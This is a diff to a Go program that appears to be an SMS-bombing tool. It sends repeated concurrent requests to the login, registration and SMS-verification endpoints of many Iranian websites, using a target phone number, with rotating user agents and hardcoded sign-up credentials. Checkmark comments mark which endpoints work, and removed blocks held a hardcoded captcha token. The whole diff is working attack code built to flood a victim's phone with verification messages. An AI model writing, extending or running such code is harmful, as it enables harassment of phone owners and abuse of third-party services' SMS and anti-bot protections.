@@ -375,7 +375,7 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
 
 	
-// --- tosinso.com
+// --- tosinso.com ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -387,28 +387,26 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- widget-service.raychat.io (GET)
+// --- widget-service.raychat.io ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         rid := "68834efb22b9366bb7367b6b"
-        href := "https://tosinso.com/login"
-        url := fmt.Sprintf("https://widget-service.raychat.io/widget/8935f66a-7fb4-4967-bcfb-4a95d4aa5e02?rid=%s&href=%s", rid, url.QueryEscape(href))
-        sendGETRequest(c, ctx, url, &wg, ch)
+        urlWithParams := fmt.Sprintf("https://widget-service.raychat.io/widget/8935f66a-7fb4-4967-bcfb-4a95d4aa5e02?rid=%s&href=https://tosinso.com/login", rid)
+        sendGETRequest(c, ctx, urlWithParams, &wg, ch)
     }
 }(client)
 
-// --- audience.yektanet.com (GET)
+// --- audience.yektanet.com ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
-        appID := "W1gWdCsq"
-        url := fmt.Sprintf("https://audience.yektanet.com/api/v1/scripts/preview/validate/?app_id=%s", appID)
-        sendGETRequest(c, ctx, url, &wg, ch)
+        urlWithParams := "https://audience.yektanet.com/api/v1/scripts/preview/validate/?app_id=W1gWdCsq"
+        sendGETRequest(c, ctx, urlWithParams, &wg, ch)
     }
 }(client)
 
-// --- accounts.khonyagar.com 
+// --- accounts.khonyagar.com step1 ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -419,42 +417,43 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- accounts.khonyagar.com 
+// --- accounts.khonyagar.com step2 ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
-        uuid := "042cdbc5-9012-4d3d-b8f4-54d570aaffb6"
-        url := fmt.Sprintf("https://accounts.khonyagar.com/api/v1/auth/request/%s/request-sms/", uuid)
+        url := "https://accounts.khonyagar.com/api/v1/auth/request/042cdbc5-9012-4d3d-b8f4-54d570aaffb6/request-sms/"
         req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, nil)
         if err != nil {
             ch <- http.StatusInternalServerError
+            wg.Done()
+            return
+        }
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+        resp, err := c.Do(req)
+        if err != nil {
+            ch <- http.StatusInternalServerError
         } else {
-            req.Header.Set("Content-Type", "application/json")
-            resp, err := c.Do(req)
-            if err != nil {
-                ch <- http.StatusInternalServerError
-            } else {
-                ch <- resp.StatusCode
-                resp.Body.Close()
-            }
+            ch <- resp.StatusCode
+            resp.Body.Close()
         }
         wg.Done()
     }
 }(client)
 
-// --- sso.armanienglish.com
+// --- sso.armanienglish.com ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         formData := url.Values{}
         formData.Set("email", "codedbymonsmain@gmail.com")
-        formData.Set("mobile", getPhoneNumber98NoZero(phone))
+        formData.Set("mobile", "98"+getPhoneNumberNoZero(phone))
         formData.Set("password", "monsmain@")
         sendFormRequest(c, ctx, "https://sso.armanienglish.com/api/register", formData, &wg, ch)
     }
 }(client)
 
-// --- crm.fenefx.net
+// --- crm.fenefx.net ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -467,43 +466,18 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- gw.darmankade.com
+// --- api.doctoreto.com ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         payload := map[string]interface{}{
-            "UserName": phone,
-            "invitationCode": "",
-            "CaptchaToken": "AePsWyPrqV74ei89KcYiXaLwLubFieVvKg", 
-            "RouterPath": "/c/psychologist/",
-            "UserAgent": userAgents[rand.Intn(len(userAgents))],
-        }
-        sendJSONRequest(c, ctx, "https://gw.darmankade.com/Account/SendCode", payload, &wg, ch)
-    }
-}(client)
-
-// --- api.snapp.doctor 
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        url := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=%%2B98", phone)
-        sendGETRequest(c, ctx, url, &wg, ch)
-    }
-}(client)
-
-// --- api.doctoreto.com
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": strings.TrimPrefix(phone, "0"),
+            "mobile": getPhoneNumberNoZero(phone),
             "country_id": 205,
             "captcha": "",
         }
         sendJSONRequest(c, ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", payload, &wg, ch)
     }
 }(client)
-
 
 
 		
